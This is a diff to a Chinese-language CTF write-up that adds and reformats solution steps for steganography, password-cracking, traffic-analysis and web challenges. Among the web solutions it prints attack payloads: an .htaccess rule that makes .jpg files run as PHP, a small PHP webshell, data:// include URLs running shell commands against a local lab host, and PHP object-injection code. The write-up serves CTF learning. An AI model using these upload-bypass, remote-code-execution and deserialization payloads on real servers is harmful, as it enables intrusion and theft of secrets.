@@ -1,7 +1,3 @@
-好的，我将把“这是一个...Webshell!?”的解题阐述精简，使其与你提供的其他题解格式保持一致。
-
----
-
 # CTF WP (ZUENS2020)
 
 ## 安全杂项
@@ -11,15 +7,37 @@
 - ez_LSB ✅
   - 使用StegSolve
     ![StegSolve][StegSolve]
+- ez_锟斤拷???? ✅
+  - 使用工具cyberchef.io解码文件内容得到flag
+- weird_photo ✅
+  - 使用010editor查看crc，发现宽高与crc不匹配
+  - 搜索crc爆破工具，运行脚本成功得到正确高度，输入高度得到图片中的flag
+- encrypted_pdf ✅
+  - 使用jhon2pdf获得hash
+  - 使用hashcat成功爆破
+- 哈基米难没露躲 ✅
+  - 使用[https://github.com/ZUENS2020/Hex_CTF](https://github.com/ZUENS2020/Hex_CTF)（推销一下我写的工具）发现zip中隐藏有url
+  - 访问url并输入txt内容发现fakeflag
+  - 询问AI发现有隐藏字符，使用工具成功得到flag
 - SSTV ✅
-  ![SSTV][SSTV]
-- 掐住一只耳 ✅
+  - ![SSTV][SSTV]
+- 捂住一只耳 ✅
   - 使用Audacity可以发现左声道的摩斯电码
     ![moss][moss]
 - Enchantment ✅
   - 使用tshark从enchantment.pcapng中找出图片-AI
     ![SGA][SGA]
   - 解开SGA银河字母[https://www.dcode.fr/standard-galactic-alphabet]
+- WebRepo ✅
+  - 使用zsteg分割图片隐写得到hidden
+  - 发现是个空的git仓库
+  - 通过git log发现提交记录
+  - 通过git show发现flag3
+- ez_ssl ✅
+  - 使用wireshark查看抓包记录
+  - 发现密钥
+  - 使用wireshark 编辑-首选项-Protocols-TLS 解密发现zip文件 ------AI
+  - 根据提示使用ARCHPR成功解开zip密码获得flag
 - ez_png ✅
   - 理解 PNG 文件结构:    -AI
     PNG 格式由一连串 chunk（数据块）组成，每个 chunk 包括：
@@ -33,11 +51,13 @@
     ![chunk][chunk]
   - 解码899 007部分 -AI
     ![Zlib][Zlib]
-- WebRepo ✅
-  - 使用zsteg分割图片隐写得到hidden
-  - 发现是个空的git仓库
-  - 通过git log发现提交记录
-  - 通过git show发现flag3
+- 万里挑一 ✅
+  - 编写脚本解压并尝试密码解开外层zip ------AI
+  - 查看内层压缩包发现提示有明文exe文件，通过ARCHPR明文攻击exe文件标识头解密并获得flag
+- Encrypted volume ✅
+  - 根据提示并上网搜索下载VeraCrypt
+  - 通过观察把volume.rar中key.png的标识头中的03改为与前一个文件中相同的02![rar][rar]
+  - 解压出key和卷使用VeraCrypt装载得到flag
 
 ## 从此开始
 
@@ -54,14 +74,6 @@
 - syslock
 - easylibc
 - fmt_S
-
-## 密码学
-
-- Crypto入门指北 ✅
-- ez_DES ✅
-- baby_next ✅
-- ez_square ✅
-- ezlegendre ✅
 
 ## 逆向工程
 
@@ -201,29 +213,37 @@
       <解析>&xxe;</解析>
   </阵枢>
   ```
+
   - 尝试使用 <阵枢> 作为根元素，<解析> 作为包含实体引用的子元素。-----AI
 - 14 第十四章 御神关·补天玉碑 ✅
+
   - 访问页面发现要上传文件
   - 根据经验判断要使用php文件运行命令
   - 通过上传.htaccess配置系统将jpg作为php运行------AI
+
   ```
   AddType application/x-httpd-php .jpg
   ```
+
   - 上传jpg：
+
   ```
   <?php
   @eval(system("env"));
   ?>
   ```
+
   - 访问jpg并成功得到flag
 - 16 第十六章 昆仑星途 ✅
+
   - 观察网页中的php代码发现可以利用漏洞访问文件
   - 通过entrypoint.sh发现flag的文件名是随机的
   - 通过php.ini发现allow_url_include = On，可以使用
-  - 尝试使用filter：http://127.0.0.1:1960/index.php?file=data://text/plain,<?php%20system('ls%20-la%20/');%20?>获取flag文件名成功------AI
+  - 尝试使用filter：http://127.0.0.1:1960/index.php?file=data://text/plain,`<?php%20system('ls%20-la%20/');%20?>`获取flag文件名成功------AI
   - 再次尝试使用filter获取flag内容时失败
-  - 使用http://127.0.0.1:1960/index.php?file=data://text/plain,<?php%20system('cat%20/flag-0200GGsprpcMFYoMEOLww2geegDXIa.txt');%20?>成功获得flag------AI
+  - 使用http://127.0.0.1:1960/index.php?file=data://text/plain,`<?php%20system('cat%20/flag-0200GGsprpcMFYoMEOLww2geegDXIa.txt');%20?>`成功获得flag------AI
 - 17 第十七章 星骸迷阵·神念重构 ✅
+
   - 观察题目给出的php代码，发现可以利用类A中的a传递php代码并执行
   - 构造Payload：
     ```php
@@ -245,9 +265,11 @@
   - 使用php运行得到url
   - 得到flag
 - 18 第十八章 万卷诡阁·功法连环 ✅
+
   - 观察页面发现是php对象注入
   - 构造查看env的payload（**一定注意PersonA的name是私有的**------AI）
   - payload关键点：
+
   ```
   // 使用反射 (Reflection) API 来强制给私有属性 $name 赋值
   $reflection = new ReflectionClass('PersonA');
@@ -255,6 +277,7 @@
   $property->setAccessible(true); // 解除私有属性的访问限制
   $property->setValue($person_a, $person_b); // 将 PersonA 实例的 name 属性设置为我们创建的 PersonB 实例
   ```
+
   - 使用php将payload序列化并进行url编码
   - 访问包含payload的url并成功得到flag
 - 19 第十九章 星穹真相·补天归源 ✅
@@ -270,3 +293,4 @@
 [SGA]: https://cdn.luogu.com.cn/upload/image_hosting/082kb65a.png?x-oss-process=image/resize,m_lfit,h_170,w_225
 [chunk]: https://cdn.luogu.com.cn/upload/image_hosting/bw3glndu.png?x-oss-process=image/resize,m_lfit,h_170,w_225
 [Zlib]: https://cdn.luogu.com.cn/upload/image_hosting/s1by0js1.png
+[rar]: https://cdn.luogu.com.cn/upload/image_hosting/39ppr2jv.png
